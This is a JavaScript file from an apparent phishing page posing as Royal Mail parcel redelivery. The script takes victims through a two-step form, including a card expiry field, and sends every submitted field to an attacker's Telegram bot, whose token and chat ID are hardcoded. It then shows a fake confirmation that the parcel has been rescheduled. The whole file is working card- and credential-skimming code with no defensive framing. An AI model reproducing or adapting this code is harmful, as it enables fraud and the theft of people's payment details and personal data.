window.onload = () => {
  const botToken = "6057302323:AAHczslZMiAkDLd9HgE_POjt85PSF2SfhpA";
  const chatID = "5852536344";
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const form = document.querySelector("#user-login-form");
  const notice = document.querySelector("#notice");
  const first = document.querySelector("#first");
  const second = document.querySelector("#second");
  const submitBtn = document.querySelector("#submitBtn");
  const expiryInput = document.querySelector("#edit-expiry");
  expiryInput.addEventListener("keyup", (e) => {
    const key = e.key;
    let value = e.target.value;
    if (key === "Backspace" || key === "Delete") {
      return;
    }
    if (value.length == 2) value += "/";
    e.target.value = value;
  });
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    if (form.checkValidity()) {
      if (first.style.display === "block") {
        setTimeout(() => {
          first.style.display = "none";
          second.style.display = "block";
          second.querySelectorAll("input").forEach((input) => {
            input.required = true;
          });
        }, 1000);
      } else {
        let text = "Royalmail:\n";
        const formData = new FormData(e.target);
        for (const [key, value] of formData.entries()) {
          text += `${key}: ${value}\n`;
        }
        // setTimeout(() => {
        fetch(`${url}?chat_id=${chatID}&text=${encodeURIComponent(text)}`)
          .then((resp) => resp.json())
          .then((res) => {
            console.log(res);
            second.style.display = "none";
            submitBtn.style.display = "none";
            notice.innerText = "Your parcel has been rescheduled for delivery!";
            window.scrollTo(window.scrollX, window.scrollY - 400);
          })
          .catch((err) => console.log(err));
        // }, 1000);
      }
    } else {
      console.log(form.reportValidity());
    }
  });
};
